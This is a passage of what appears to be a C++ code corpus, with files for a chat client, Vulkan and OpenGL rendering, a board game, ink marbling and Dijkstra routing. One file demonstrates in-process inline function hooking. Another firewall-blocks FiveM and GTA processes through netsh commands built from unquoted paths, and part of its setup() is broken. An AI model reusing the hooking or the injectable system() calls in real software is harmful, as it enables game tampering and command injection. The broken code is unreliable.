\u0438\u0441\u043f\u043e\u043b\u043d\u044f\u044e\u0449\u0435\u043c\u0443 \u0444\u0430\u0439\u043b\u0443           \u041f\u043e\u043b\u0443\u0447\u0430\u0435\u043c \u0434\u0438\u0440\u0435\u043a\u0442\u043e\u0440\u0438\u044e \u0438\u0441\u043f\u043e\u043b\u043d\u044f\u044e\u0449\u0435\u0433\u043e \u0444\u0430\u0439\u043b\u0430\n    std::filesystem::path executablePath = std::filesystem::absolute(std::filesystem::path(argv[0]));\n    std::filesystem::path directory = executablePath.parent_path();\n\n    // \u0430\u0432\u0442\u043e\u043c\u0430\u0442\u0438\u0447\u0435\u0441\u043a\u0438 \u0441\u043e\u0437\u0434\u0430\u0432\u0430\u0442\u044c ini \u0444\u0430\u0439\u043b\n    checkingTheExistenceOfValues(directory, \"Network\", \"debug\");\n    checkingTheExistenceOfValues(directory, \"Network\", \"Server_ip\");\n    checkingTheExistenceOfValues(directory, \"Network\", \"port\");\n\n    std::string debug = iniRead(directory, \"Network\", \"debug\");\n    std::string serverIp = iniRead(directory, \"Network\", \"Server_ip\");\n    std::string strPort = iniRead(directory, \"Network\", \"port\");\n\n    sf::TcpSocket socket;\n    std::string name;\n    std::string message;\n    MessageQueue messageQueue;\n\n    std::cout << \"Enter your name: \";\n    std::getline(std::cin, name);\n    std::cout << \"\\n\";\n\n    if (socket.connect(serverIp, std::stoi(strPort)) != sf::Socket::Done)\n    {\n        std::cerr << \"Error connecting to server\" << std::endl;\n        return 1;\n    }\n    std::cout << \"connection established\" << std::endl;\n\n    socket.setBlocking(false);\n\n    std::thread receiveMessagesThread(&receiveMessages, std::ref(socket), std::ref(messageQueue));\n    std::thread printReceiveMessagesThread(&printReceiveMessage, std::ref(messageQueue));\n    // \u043f\u0435\u0440\u0432\u043e\u0435 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 - \u0442\u0435\u0440\u044f\u0435\u0442\u0441\u044f, \u043f\u0443\u0441\u0442\u043e\u0435 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 \u043e\u0442 \u0441\u0435\u0440\u0432\u0435\u0440\u0430 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u044f\u0435\u0442\u0441\u044f\n    receiveMessagesThread.detach();\n    printReceiveMessagesThread.detach();\n\n    while (true)\n    {\n        std::cout << \"Enter message: \";\n        std::getline(std::cin, message);\n\n        if (message != \"\")\n        {\n            if (socket.send(message.c_str(), message.size() + 1) != sf::Socket::Done)\n            {\n                std::cout << \"Error sending message\" << std::endl;\n            }\n        }\n    }\n\n    return 0;\n}\n\n",
    "#include \"DebugUtilsMessenger.hpp\"\n#include \"Instance.hpp\"\n#include \"Utilities/Console.hpp\"\n#include \"Utilities/Exception.hpp\"\n#include <iostream>\n\nnamespace Vulkan {\n\n\tnamespace\n\t{\n\n\t\tconst char* ObjectTypeToString(const VkObjectType objectType)\n\t\t{\n\t\t\tswitch (objectType)\n\t\t\t{\n#define STR(e) case VK_OBJECT_TYPE_ ## e: return # e\n\t\t\tSTR(UNKNOWN);\n\t\t\tSTR(INSTANCE);\n\t\t\tSTR(PHYSICAL_DEVICE);\n\t\t\tSTR(DEVICE);\n\t\t\tSTR(QUEUE);\n\t\t\tSTR(SEMAPHORE);\n\t\t\tSTR(COMMAND_BUFFER);\n\t\t\tSTR(FENCE);\n\t\t\tSTR(DEVICE_MEMORY);\n\t\t\tSTR(BUFFER);\n\t\t\tSTR(IMAGE);\n\t\t\tSTR(EVENT);\n\t\t\tSTR(QUERY_POOL);\n\t\t\tSTR(BUFFER_VIEW);\n\t\t\tSTR(IMAGE_VIEW);\n\t\t\tSTR(SHADER_MODULE);\n\t\t\tSTR(PIPELINE_CACHE);\n\t\t\tSTR(PIPELINE_LAYOUT);\n\t\t\tSTR(RENDER_PASS);\n\t\t\tSTR(PIPELINE);\n\t\t\tSTR(DESCRIPTOR_SET_LAYOUT);\n\t\t\tSTR(SAMPLER);\n\t\t\tSTR(DESCRIPTOR_POOL);\n\t\t\tSTR(DESCRIPTOR_SET);\n\t\t\tSTR(FRAMEBUFFER);\n\t\t\tSTR(COMMAND_POOL);\n\t\t\tSTR(SAMPLER_YCBCR_CONVERSION);\n\t\t\tSTR(DESCRIPTOR_UPDATE_TEMPLATE);\n\t\t\tSTR(SURFACE_KHR);\n\t\t\tSTR(SWAPCHAIN_KHR);\n\t\t\tSTR(DISPLAY_KHR);\n\t\t\tSTR(DISPLAY_MODE_KHR);\n\t\t\tSTR(DEBUG_REPORT_CALLBACK_EXT);\n\t\t\tSTR(DEBUG_UTILS_MESSENGER_EXT);\n\t\t\tSTR(ACCELERATION_STRUCTURE_KHR);\n\t\t\tSTR(VALIDATION_CACHE_EXT);\n\t\t\tSTR(PERFORMANCE_CONFIGURATION_INTEL);\n\t\t\tSTR(DEFERRED_OPERATION_KHR);\n\t\t\tSTR(INDIRECT_COMMANDS_LAYOUT_NV);\n#undef STR\n\t\t\tdefault: return \"unknown\";\n\t\t\t}\n\t\t}\n\n\t\tVKAPI_ATTR VkBool32 VKAPI_CALL VulkanDebugCallback(\n\t\t\tconst VkDebugUtilsMessageSeverityFlagBitsEXT messageSeverity,\n\t\t\tconst VkDebugUtilsMessageTypeFlagsEXT messageType,\n\t\t\tconst VkDebugUtilsMessengerCallbackDataEXT* const pCallbackData,\n\t\t\tvoid* const pUserData)\n\t\t{\n\t\t\t(void)pUserData;\n\n\t\t\tconst auto attributes = Utilities::Console::SetColorBySeverity(static_cast<Utilities::Severity>(messageSeverity));\n\n\t\t\tswitch (messageSeverity)\n\t\t\t{\n\t\t\tcase VK_DEBUG_UTILS_MESSAGE_SEVERITY_VERBOSE_BIT_EXT:\n\t\t\t\tstd::cerr << \"VERBOSE: \";\n\t\t\t\tbreak;\n\t\t\tcase VK_DEBUG_UTILS_MESSAGE_SEVERITY_INFO_BIT_EXT:\n\t\t\t\tstd::cerr << \"INFO: \";\n\t\t\t\tbreak;\n\t\t\tcase VK_DEBUG_UTILS_MESSAGE_SEVERITY_WARNING_BIT_EXT:\n\t\t\t\tstd::cerr << \"WARNING: \";\n\t\t\t\tbreak;\n\t\t\tcase VK_DEBUG_UTILS_MESSAGE_SEVERITY_ERROR_BIT_EXT:\n\t\t\t\tstd::cerr << \"ERROR: \";\n\t\t\t\tbreak;\n\t\t\tdefault:;\n\t\t\t\tstd::cerr << \"UNKNOWN: \";\n\t\t\t}\n\n\t\t\tswitch (messageType)\n\t\t\t{\n\t\t\tcase VK_DEBUG_UTILS_MESSAGE_TYPE_GENERAL_BIT_EXT:\n\t\t\t\tstd::cerr << \"GENERAL: \";\n\t\t\t\tbreak;\n\t\t\tcase VK_DEBUG_UTILS_MESSAGE_TYPE_VALIDATION_BIT_EXT:\n\t\t\t\tstd::cerr << \"VALIDATION: \";\n\t\t\t\tbreak;\n\t\t\tcase VK_DEBUG_UTILS_MESSAGE_TYPE_PERFORMANCE_BIT_EXT:\n\t\t\t\tstd::cerr << \"PERFORMANCE: \";\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tstd::cerr << \"UNKNOWN: \";\n\t\t\t}\n\n\t\t\tstd::cerr << pCallbackData->pMessage;\n\n\t\t\tif (pCallbackData->objectCount > 0 && messageSeverity > VK_DEBUG_UTILS_MESSAGE_SEVERITY_INFO_BIT_EXT)\n\t\t\t{\n\t\t\t\tstd::cerr << \"\\n\\n  Objects (\" << pCallbackData->objectCount << \"):\\n\";\n\n\t\t\t\tfor (uint32_t i = 0; i != pCallbackData->objectCount; ++i)\n\t\t\t\t{\n\t\t\t\t\tconst auto object = pCallbackData->pObjects[i];\n\t\t\t\t\tstd::cerr\n\t\t\t\t\t\t<< \"  - Object[\" << i << \"]: \"\n\t\t\t\t\t\t<< \"Type: \" << ObjectTypeToString(object.objectType ) << \", \"\n\t\t\t\t\t\t<< \"Handle: \" << reinterpret_cast<void*>(object.objectHandle) << \", \"\n\t\t\t\t\t\t<< \"Name: '\" << (object.pObjectName ? object.pObjectName : \"\") << \"'\"\n\t\t\t\t\t\t<< \"\\n\";\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tstd::cerr << std::endl;\n\n\t\t\tUtilities::Console::SetColorByAttributes(attributes);\n\n\t\t\treturn VK_FALSE;\n\t\t}\n\n\t\tVkResult CreateDebugUtilsMessengerEXT(VkInstance instance, const VkDebugUtilsMessengerCreateInfoEXT* pCreateInfo, const VkAllocationCallbacks* pAllocator, VkDebugUtilsMessengerEXT* pCallback)\n\t\t{\n\t\t\tconst auto func = reinterpret_cast<PFN_vkCreateDebugUtilsMessengerEXT>(vkGetInstanceProcAddr(instance, \"vkCreateDebugUtilsMessengerEXT\"));\n\t\t\treturn func != nullptr\n\t\t\t\t? func(instance, pCreateInfo, pAllocator, pCallback)\n\t\t\t\t: VK_ERROR_EXTENSION_NOT_PRESENT;\n\t\t}\n\n\t\tvoid DestroyDebugUtilsMessengerEXT(VkInstance instance, VkDebugUtilsMessengerEXT callback, const VkAllocationCallbacks* pAllocator)\n\t\t{\n\t\t\tconst auto func = reinterpret_cast<PFN_vkDestroyDebugUtilsMessengerEXT>(vkGetInstanceProcAddr(instance, \"vkDestroyDebugUtilsMessengerEXT\"));\n\t\t\tif (func != nullptr) {\n\t\t\t\tfunc(instance, callback, pAllocator);\n\t\t\t}\n\t\t}\n\t}\n\nDebugUtilsMessenger::DebugUtilsMessenger(const Instance& instance, VkDebugUtilsMessageSeverityFlagBitsEXT threshold) :\n\tinstance_(instance),\n\tthreshold_(threshold)\n{\n\tif (instance.ValidationLayers().empty())\n\t{\n\t\treturn;\n\t}\n\n\tVkDebugUtilsMessageSeverityFlagsEXT severity = 0;\n\n\tswitch (threshold)\n\t{\n\tcase VK_DEBUG_UTILS_MESSAGE_SEVERITY_VERBOSE_BIT_EXT:\n\t\tseverity |= VK_DEBUG_UTILS_MESSAGE_SEVERITY_VERBOSE_BIT_EXT;\n\tcase VK_DEBUG_UTILS_MESSAGE_SEVERITY_INFO_BIT_EXT: \n\t\tseverity |= VK_DEBUG_UTILS_MESSAGE_SEVERITY_INFO_BIT_EXT;\n\tcase VK_DEBUG_UTILS_MESSAGE_SEVERITY_WARNING_BIT_EXT:\n\t\tseverity |= VK_DEBUG_UTILS_MESSAGE_SEVERITY_WARNING_BIT_EXT;\n\tcase VK_DEBUG_UTILS_MESSAGE_SEVERITY_ERROR_BIT_EXT:\n\t\tseverity |= VK_DEBUG_UTILS_MESSAGE_SEVERITY_ERROR_BIT_EXT;\n\t\tbreak;\n\tdefault:\n\t\tThrow(std::invalid_argument(\"invalid threshold\"));\n\t}\n\n\tVk",
    "\ufeff#include<iostream>\r\n#include<algorithm>\r\n#include<cstdio>\r\n#include<cmath>\r\n#include<map>\r\n#include<vector>\r\n#include<queue>\r\n#include<stack>\r\n#include<set>\r\n#include<string>\r\n#include<cstring>\r\n#include<list>\r\n#include<stdlib.h>\r\n#include <Windows.h>\r\n#include <tchar.h>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <Windows.h>\r\n#include <iostream>\r\n#include <string.h>\r\n\r\n\r\n\r\nusing namespace std;\r\ntypedef VOID(*PFUNMSG)(LPCWSTR szMsg, LPCWSTR Title);\r\n#pragma comment(linker,\"/INCLUDE:__tls_used\")\r\nHMODULE hModule;\r\nPFUNMSG Crypto;\r\n\r\nBYTE __NewCode[7] = { 0xE9, 0x0, 0x0, 0x0, 0x0, 0x0 };\r\nBYTE __OldCode[7] = { 0 };\r\n\r\nint fun2();\r\nint fun1();\r\nvoid InlineHook();\r\n\r\n\r\nvoid InlineHook()\r\n{\r\n\r\n    if (ReadProcessMemory(INVALID_HANDLE_VALUE, fun2, __OldCode, 7, NULL) == 0)\r\n    {\r\n        printf(\"ReadProcessMemory error\\n\");\r\n        return;\r\n    }\r\n\r\n    DWORD JmpAddress = (DWORD)fun1;\r\n    // \u8ba1\u7b97\u81ea\u5b9a\u4e49\u51fd\u6570\u7684\u5730\u5740.\r\n    // \u6784\u9020\u65b0\u5934\u90e8\u4ee3\u7801\r\n    __NewCode[0] = 0xB8;            //\r\n    memcpy(&__NewCode[1], &JmpAddress, 4);    // mov eax, _JmpAddr\r\n    __NewCode[5] = 0xFF;            //\r\n    __NewCode[6] = 0xE0;            // jmp eax\r\n    DWORD dwOldProtect = 0;\r\n    //DWORD dwOldProtect = 0; //\u65e7\u4fdd\u62a4\u5c5e\u6027\r\n    // \u53bb\u5185\u5b58\u4fdd\u62a4\r\n    ::VirtualProtect(fun2, 7, PAGE_EXECUTE_READWRITE, &dwOldProtect);\r\n    //\u5199\u5165\u8df3\u8f6c\uff0c\u5f00\u59cbHook\r\n    WriteProcessMemory(INVALID_HANDLE_VALUE, fun2, __NewCode, 7, NULL);\r\n    // \u5199\u5185\u5b58\u4fdd\u62a4\r\n    ::VirtualProtect(fun2, 7, dwOldProtect, &dwOldProtect);\r\n}\r\n\r\n\r\n\r\n\r\nint main()\r\n{\r\n    InlineHook();\r\n    fun2();\r\n}\r\n\r\nint fun2() {\r\n    puts(\"Right!\");\r\n    return 0;\r\n}\r\n\r\nint fun1() {\r\n    puts(\"If You see me,That's Mean's you are success!\");\r\n    return 0;\r\n}\r\n\r\n",
    "#include \"gRender.h\"\n\n#include \"gShaderSource.h\"\n#include \"gVertexArray.h\"\n#include \"gTexture.h\"\n#include \"gShader.h\"\n#include \"gl.h\" \n\n#include \"gColor.h\"\n\nnamespace grr {\n    std::unordered_map<BufferBindingTarget, u32> gRender::m_bufferMap {\n        {BufferBindingTarget::GR_ARRAY_BUFFER, GL_ARRAY_BUFFER},\n        {BufferBindingTarget::GR_ELEMENT_ARRAY_BUFFER, GL_ELEMENT_ARRAY_BUFFER}\n    };\n\n    gVertexArray* gRender::m_vertexArray2D = nullptr;\n    gVertexArray* gRender::m_vertexArray3D = nullptr;\n\n    gShader* gRender::m_shader2D = nullptr;\n    gShader* gRender::m_shader3D = nullptr;\n    gShader* gRender::m_shaderInstanced3D = nullptr;\n\n    u32 gRender::m_height = 0;\n    u32 gRender::m_width = 0;\n\n    u32 indexPrimi3D = 0;\n    u32 indexVbo3D = 0;\n    u32 indexEbo3D = 0;\n\n    void gRender::SetRenderState(RenderState state, void *value) {\n        switch (state) {\n        case GR_BACKGROUND_COLOR: {\n            gColor* color = (gColor*)value;\n            GL_CALL(glClearColor(color->r, color->g, color->b, color->a));\n            break;\n        }\n        case GR_VIEWPORT: {\n            Vector2* size = (Vector2*)value;\n            GL_CALL(glViewport(0, 0, size->x, size->y));\n            break;\n        }\n        default:\n            std::cout << \"Invalid V: \" << getRenderStateName(state) << std::endl;\n            break;\n        }\n    }\n\n    void gRender::SetRenderState(RenderState state, u16 value) {\n        switch (state) {\n        case GR_BACKGROUND: {\n            GLbitfield filter = 0;\n            if ((value & GR_DEPTH_BUFFER) == GR_DEPTH_BUFFER) {\n                filter |= GL_DEPTH_BUFFER_BIT;\n            }\n            if ((value & GR_COLOR_BUFFER) == GR_COLOR_BUFFER) {\n                filter |= GL_COLOR_BUFFER_BIT;\n            }\n            return GL_CALL(glClear(filter));\n        }\n        case GR_CULL_FACE: {\n            if (value == GR_TRUE) {\n                return GL_CALL(glEnable(GL_CULL_FACE));\n            }\n            return GL_CALL(glDisable(GL_CULL_FACE));\n        }\n        case GR_CULL: {\n            if ((value & GR_FRONT) == GR_FRONT && (value & GR_BACK) == GR_BACK) {\n                return GL_CALL(glCullFace(GL_FRONT_AND_BACK));\n            } else if ((value & GR_BACK) == GR_BACK) {\n                return GL_CALL(glCullFace(GL_BACK));\n            }\n            return GL_CALL(glCullFace(GL_FRONT));\n        }\n        case GR_DEPTH: {\n            if (value == GR_TRUE) {\n                return GL_CALL(glEnable(GL_DEPTH_TEST));\n            }\n            return GL_CALL(glDisable(GL_DEPTH_TEST));\n        }\n        default:\n            std::cout << \"Invalid Va: \" << getRenderStateName(state) << std::endl;\n        }\n    }\n\n    const std::string gRender::getRenderStateName(RenderState state) {\n        #define GET_ENUM_NAME(e) case e: return #e\n        switch (state) {\n        GET_ENUM_NAME(GR_FALSE);\n        GET_ENUM_NAME(GR_TRUE);\n        GET_ENUM_NAME(GR_BACKGROUND_COLOR);\n        GET_ENUM_NAME(GR_BACKGROUND);\n        GET_ENUM_NAME(GR_DEPTH_BUFFER);\n        GET_ENUM_NAME(GR_COLOR_BUFFER);\n        GET_ENUM_NAME(GR_CULL_FACE);\n        GET_ENUM_NAME(GR_CULL);\n        GET_ENUM_NAME(GR_FRONT);\n        GET_ENUM_NAME(GR_BACK);\n        GET_ENUM_NAME(GR_DEPTH);\n        GET_ENUM_NAME(GR_VIEWPORT);\n        default:\n            return \"undefined\";\n        }\n        #undef GET_ENUM_NAME\n    }\n\n    const bool gRender::OpenGLInit() {\n        #if !GR_OPENGLES3\n        if (glewInit() != GLEW_OK) {\n            return false;\n        }\n        #endif\n\n        #if GR_OPENGLES3\n        const std::string glVersion = \"#version 300 es\";\n        #else\n        const std::string glVersion = \"#version 330 core\";\n        #endif\n\n        CreateVertexArray2D();\n        m_shader2D = gShader::Create({(glVersion + fragmentShader2D).c_str()}, {(glVersion + vertexShader2D).c_str()});\n\n        CreateVertexArray3D();\n        m_shader3D = gShader::Create({(glVersion + fragmentShader3D).c_str()}, {(glVersion + vertexShader3D).c_str()});\n\n        m_shaderInstanced3D = gShader::Create({(glVersion + fragmentShader3D).c_str()}, {(glVersion + vertexShaderInstance3D).c_str()});\n\n        return true;\n    }\n\n    void gRender::SetResolution(u32 width, u32 height) {\n        m_height = height;\n        m_width = width;\n    }\n\n    void gRender::Render2D() {\n        Matrix4x4 projection = Math::orthographic(0.0f, m_width, 0.0f, m_height, -1.0f, 1.0f);\n        \n        m_shader2D->bind();\n        m_shader2D->SetUniformMat4(\"projection\", projection);\n    }\n\n    void gRender::RenderTexture2D(const Matrix3x3 &model, gTexture *texture) {\n    }\n\n    void gRender::RenderPrimitive2D(PrimitiveType primitive, u32 numVertice, void *vertice) {\n        // m_vertexArray2D->bind();\n\n        // gVertexArray::Use(BufferType_VBO);\n        // gVertexArray::SetBufferUpdate(0, numVertice * sizeof(gVertex2D), vertice);\n\n        // gVertexArray::DrawArrays(primitive, numVertice);\n    }\n\n    void gRender::RenderIndexedPrimitive2D(PrimitiveType primitive, u32 numVertice, void *",
    "#include \"Game.h\"\r\n#include \"Difficulty.h\"\r\n#include <iostream>\r\n#include <ctime>\r\n#include <cstdlib>\r\n#include <fstream>\r\n#include <sstream>\r\n#include <cmath>\r\n#include <map>\r\n\r\n// Definicja zmiennych globalnych\r\nconst int windowWidth = 1000;\r\nconst int windowHeight = 600;\r\nconst float initialSpeed = 500.0f;\r\nconst float stopSpeed = 3.0f;\r\nconst int boardSize = 100;\r\n\r\nGame::Game() {\r\n    loadTextures(); // \u00a3adowanie tekstur\r\n    loadSounds(); // \u00a3adowanie d\u0178wi\u00eak\u00f3w\r\n}\r\n\r\nvoid Game::run() {\r\n    // Tworzenie okna gry\r\n    sf::RenderWindow window(sf::VideoMode(windowWidth, windowHeight), \"Snakes and Ladders\", sf::Style::Titlebar | sf::Style::Close);\r\n    window.setFramerateLimit(60); // Ustawienie limitu klatek na sekund\u00ea\r\n\r\n    sf::Music music; // Obiekt muzyki\r\n    if (!music.openFromFile(\"assets/muzyka.ogg\")) { // \u00a3adowanie muzyki z pliku\r\n        std::cerr << \"Failed to load music\\n\";\r\n        return;\r\n    }\r\n    music.setLoop(true); // Ustawienie p\u00eatli dla muzyki\r\n    music.setVolume(10); // Ustawienie g\u00b3o\u0153no\u0153ci muzyki\r\n\r\n    showMenu(window, music); // Wy\u0153wietlenie menu gry\r\n}\r\n\r\nvoid Game::startGame(sf::RenderWindow& window, Difficulty difficulty, int numPlayers, sf::Music& music, const std::string& boardTexture) {\r\n    sf::Sprite diceSprite;\r\n    diceSprite.setTexture(diceTextures[0]); // Ustawienie tekstury kostki\r\n    diceSprite.setPosition(windowWidth / 2 - diceSprite.getGlobalBounds().width / 2, windowHeight / 2 - diceSprite.getGlobalBounds().height / 2); // Ustawienie pozycji kostki\r\n\r\n    sf::Font font;\r\n    font.loadFromFile(\"assets/arial.ttf\"); // \u00a3adowanie czcionki\r\n    sf::Text rollButton(\"Rzuc kostka\", font, 30); // Tekst przycisku rzutu kostk\u00b9\r\n    rollButton.setPosition(windowWidth - 200, 50); // Pozycja przycisku rzutu kostk\u00b9\r\n    rollButton.setFillColor(sf::Color::White); // Kolor tekstu przycisku rzutu kostk\u00b9\r\n\r\n    sf::Text stopButton(\"Stop\", font, 30); // Tekst przycisku stop\r\n    stopButton.setPosition(windowWidth - 200, 100); // Pozycja przycisku stop\r\n    stopButton.setFillColor(sf::Color::White); // Kolor tekstu przycisku stop\r\n\r\n    sf::Text diceValue(\"\", font, 30); // Tekst warto\u0153ci kostki\r\n    diceValue.setPosition(windowWidth - 200, 150); // Pozycja tekstu warto\u0153ci kostki\r\n    diceValue.setFillColor(sf::Color::White); // Kolor tekstu warto\u0153ci kostki\r\n\r\n    sf::Text playerPositions(\"\", font, 20); // Tekst pozycji graczy\r\n    playerPositions.setPosition(windowWidth - 200, 200); // Pozycja tekstu pozycji graczy\r\n    playerPositions.setFillColor(sf::Color::White); // Kolor tekstu pozycji graczy\r\n\r\n    Board board(difficulty, boardTexture, *this); // Utworzenie planszy\r\n    Player player1(sf::Color::Red, \"Player 1\"); // Utworzenie gracza 1\r\n    Player player2(sf::Color::Blue, \"Player 2\"); // Utworzenie gracza 2\r\n    Player player3(sf::Color::Green, \"Player 3\"); // Utworzenie gracza 3\r\n    Player player4(sf::Color::Yellow, \"Player 4\"); // Utworzenie gracza 4\r\n\r\n    std::vector<Player*> players = { &player1, &player2, &player3, &player4 }; // Wektor wska\u0178nik\u00f3w do graczy\r\n    players.resize(numPlayers); // Ustawienie rozmiaru wektora graczy\r\n\r\n    for (auto& player : players) {\r\n        player->resetPosition(); // Reset pozycji graczy\r\n    }\r\n\r\n    int currentPlayerIndex = 0; // Indeks aktualnego gracza\r\n\r\n    bool isRolling = false; // Flaga rzutu kostk\u00b9\r\n    bool extraRoll = false; // Flaga dodatkowego rzutu\r\n    float speed = initialSpeed; // Pocz\u00b9tkowa szybko\u0153\u00e6 kostki\r\n    sf::Vector2f direction(1.0f, 1.0f); // Kierunek ruchu kostki\r\n    sf::Clock clock; // Zegar\r\n    sf::Clock faceChangeClock; // Zegar zmiany strony kostki\r\n    int currentFace = 0; // Aktualna strona kostki\r\n    int diceResult = 0; // Wynik rzutu kostk\u00b9\r\n\r\n    srand(static_cast<unsigned int>(time(0))); // Inicjalizacja generatora losowego\r\n\r\n    if (music.getStatus() != sf::Music::Playing) {\r\n        music.play(); // Odtwarzanie muzyki\r\n    }\r\n\r\n    while (window.isOpen()) {\r\n        sf::Event event;\r\n        while (window.pollEvent(event)) {\r\n            if (event.type == sf::Event::Closed) {\r\n                window.close(); // Zamkni\u00eacie okna\r\n            }\r\n            if (event.type == sf::Event::MouseButtonPressed) {\r\n                if (event.mouseButton.button == sf::Mouse::Left) {\r\n                    if (rollButton.getGlobalBounds().contains(event.mouseButton.x, event.mouseButton.y) && !isRolling) {\r\n                        isRolling = true; // Rozpocz\u00eacie rzutu kostk\u00b9\r\n                        speed = initialSpeed; // Ustawienie szybko\u0153ci\r\n                        direction.x = static_cast<float>(rand() % 200 - 100) / 100.0f; // Losowanie kierunku ruchu x\r\n                        direction.y = static_cast<float>(rand() % 200 - 100) / 100.0f; // Losowanie kierunku ruchu y\r\n                        faceChangeClock.restart(); // Restart zegara zmiany strony kostki\r\n                        clock.restart(); // Restart zegara\r\n                        diceValue.setString(\"\"); // Reset tekstu warto\u0153ci kostki\r\n  ",
    "#include \"Ink.h\"\n\nInk::Ink(int x, int y, int radius, int circleDetail)\n{\n\tPosition.x = x;\n\tPosition.y = y;\n\tthis->Radius = radius;\n\n\tCreateCircle(circleDetail);\n}\n\nvoid Ink::CreateCircle(int circleDetail)\n{\n\tauto slice = 2 * M_PI / circleDetail;\n\tfor (size_t i = 0; i < circleDetail; i++)\n\t{\n\t\tauto angle = slice * i;\n\t\tauto v = sf::Vector2f(cos(angle), sin(angle));\n\t\tv.x *= this->Radius;\n\t\tv.y *= this->Radius;\n\n\t\tv.x += Position.x;\n\t\tv.y += Position.y;\n\n\t\tvertices.push_back(v);\n\t}\n}\n\nvoid Ink::Draw(sf::RenderWindow& window)\n{\n\tsf::VertexArray vertexArray(sf::TriangleFan, vertices.size());\n\t\n\tfor (size_t i = 0; i < vertices.size(); i++)\n\t{\n\t\tvertexArray[i] = (vertices[i]);\n\t\tvertexArray[i].color = color;\n\t}\n\twindow.draw(vertexArray);\n}\n\nvoid Ink::Marble(Ink other)\n{\n\tfor (auto& vert : vertices)\n\t{\n\t\t// our p\n\t\tvert = vert - other.Position;\n\n\t\tauto magnitude = sqrt(vert.x * vert.x + vert.y * vert.y);\n\n\t\tauto root = sqrt(1 + pow(other.Radius, 2) / pow(magnitude, 2));\n\n\t\tvert.x *= root;\n\t\tvert.y *= root;\n\n\t\tvert += other.Position;\n\t}\n}\n\nbool Ink::VertsOutOfWindow(sf::RenderWindow& window)\n{\n\tauto counter = 0;\n\tfor (auto& vert : vertices)\n\t{\n\t\tif (vert.x > window.getSize().x * 1.5\n\t\t\t|| vert.y > window.getSize().y * 1.5\n\t\t\t|| vert.x < 0\n\t\t\t|| vert.y < 0)\n\t\t{\n\t\t\tcounter++;\n\t\t}\n\t}\n\n\tif (counter >= vertices.size())\n\t{\n\t\treturn true;\n\t}\n\n\treturn false;\n}\n",
    "#include \"network.hpp\"\r\n#include \"trace.hpp\"\r\n\r\nvoid network::block_connection(std::string process)\r\n{\r\n\tstd::string outbound = \"netsh advfirewall firewall add rule name = \" + process + \" dir = out program = \" + process + \"  action = block\";\r\n\tsystem(outbound.c_str());\r\n\r\n\tstd::string inbound = \"netsh advfirewall firewall add rule name = \" + process + \" dir = in program = \" + process + \"  action = block\";\r\n\tsystem(inbound.c_str());\r\n}\r\n\r\nvoid network::unblock_connection(std::string process)\r\n{\r\n\tstd::string outbound = \"netsh advfirewall firewall delete rule name = \" + process + \" dir = out program = \" + process;\r\n\tsystem(outbound.c_str());\r\n\r\n\tstd::string inbound = \"netsh advfirewall firewall delete rule name = \" + process + \" dir = in program = \" + process;\r\n\tsystem(inbound.c_str());\r\n}\r\n\r\nvoid network::setup()\r\n{\r\n\t// Locate FiveM.exe\r\n\tauto fivem_path = g_trace->m_fivem_path + \"\\\\\" + \"FiveM.exe\";\r\n\tblock_connection(fivem_path);\r\n\r\n\r\n\t// Locate FiveM Subprocesses path\r\n\tauto subprocess_path = g_trace->m_fivem_path + \"\\\\\" + \"FiveM.app\" + \"\\\\\" + \"data\" + \"\\\\\" + \"cache\" + \"\\\\\" \"subprocess\";\r\n\r\n\tstd::vector<std::string> gta_versions{ \"b2545_\", \"b2372_\", \"b2189_\", \"b2060_\",  \"\" };\r\n\r\n\tfor (auto processes : gta_versions)\r\n\t{\r\n\t\t// Block the gta processes\r\n\t\tauto gta_process = subprocess_path + \"\\\\\" + \"FiveM_\" + processes + \"GTAProcess.exe\";\r\n\t\tblock_connection(gta_process);\r\n\r\n\t\t// Block the steam processes\r\n\t\tauto steam_process = subprocess_path + \"\\\\\" + \"FiveM_\" + processes + \"SteamChild.exe\";\r\n\t\t\r\n\t\tblock_connection(steam_process);\r\n\t}\t// Block the steam processes\r\n\t\tauto steam_process = subprocess_path + \"\\\\\" + \"FiveM_\" + processes + \"SteamChild.exe\";\r\n\t\tblock_connection(steam_process);\r\n\r\n}\r\n\r\n\r\nvoid network::destroy()\r\n{\r\n\t// Locate FiveM.exe\r\n\tauto fivem_path = g_trace->m_fivem_path + \"\\\\\" + \"FiveM.exe\";\r\n\tunblock_connection(fivem_path);\r\n\r\n\t// Locate FiveM Subprocesses path\r\n\tauto subprocess_path = g_trace->m_fivem_path + \"\\\\\" + \"FiveM.app\" + \"\\\\\" + \"data\" + \"\\\\\" + \"cache\" + \"\\\\\" \"subprocess\";\r\n\r\n\tstd::vector<std::string> gta_versions{ \"b2545_\", \"b2372_\", \"b2189_\", \"b2060_\",  \"\" };\r\n\r\n\tfor (auto processes : gta_versions)\r\n\t{\r\n\t\t// Block the gta processes\r\n\t\tauto gta_process = subprocess_path + \"\\\\\" + \"FiveM_\" + processes + \"GTAProcess.exe\";\r\n\t\tunblock_connection(gta_process);\r\n\r\n\t\t// Block the steam processes\r\n\t\tauto steam_process = subprocess_path + \"\\\\\" + \"FiveM_\" + processes + \"SteamChild.exe\";\r\n\t\tunblock_connection(steam_process);\r\n\t}\r\n}\r\n",
    "#include<iostream>\n#include<string>\n#include<climits>\nusing namespace std;\nint mindistance(int distance[],bool stat[])\n{\n    int minimum=INT_MAX,index;\n    for (int k=0;k<=52;k++)\n    {\n        if(stat[k]==false&&distance[k]<=minimum)\n        {\n            minimum=distance[k];\n            index=k;\n        }\n    }\n    return index;\n}\n\nvoid dijkstra(int graph[53][53],int source, string stations[53])\n{\n    int distance[53];\n    bool stat[53];\n    for(int k=0;k<=52;k++)\n    {\n        distance[k]=INT_MAX;\n        stat[k]=false;\n    }\n    distance[source]=0;\n\n    for(int k=0;k<=52;k++)\n    {\n        int m=mindistance(distance,stat);\n        stat[m]=true;\n        for(int i=0;i<=52;i++)\n        {\n            if(!stat[i]&&graph[m][i]&&distance[m]!=INT_MAX&&distance[m]+graph[m][i]<distance[i])\n                distance[i]=distance[m]+graph[m][i];\n        }\n    }\n    cout<<\"Minimum Number of stations from  \"<<stations[source]<<\" to every station\"<<endl;\n    for(int k=0;k<=52;k++)\n    {\n        cout<<\"Minimum stations from \"<<stations[source]<<\" to \"<<stations[k]<<\" are 